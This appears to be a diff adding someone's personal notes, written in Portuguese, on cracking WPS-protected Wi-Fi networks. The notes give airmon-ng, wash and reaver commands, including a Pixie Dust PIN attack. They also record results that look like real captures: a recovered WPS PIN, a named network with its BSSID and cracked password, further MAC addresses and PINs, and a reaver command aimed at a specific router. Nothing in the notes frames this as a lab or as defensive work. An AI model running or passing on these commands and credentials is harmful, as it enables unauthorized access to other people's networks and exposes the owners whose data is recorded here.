@@ -1,0 +1,49 @@
+wlan0 em modo de monitoramento
+
+ifconfig
+para verificar as placas
+
+airmon-ng start wlan0
+colocar a placa em modo monitoramento
+
+wash -i wlan0mon
+listar redes com wps
+
+[pegar o pin]
+reaver -i [placamon] -b [rede] -c [canal] -vv -f -K 1
+
+result pin: 98914524
+
+[pegar senha]
+reaver -i [redemon] -b [rede] -c [canal] -s y -vv -p [pin]
+
+[rede nome]
+vivo-ee7c
+
+[redeid]
+ac:c6:62:96:ee:7c
+
+[senha]
+c66296ee7c
+C66296EE7C
+
+00:E0:4C:8E:EE:DC
+11
+
+1C:49:7B:DA:DB:6B
+
+72:E9:22:62:42:51
+
+96596487
+
+
+1C:74:0D:88:2E:DC
+
+virus
+06117344
+
+reaver -i wlan0mon -b B0:4E:26:EF:33:0E -c 10 -vv -f -K 1
+
+
+
+
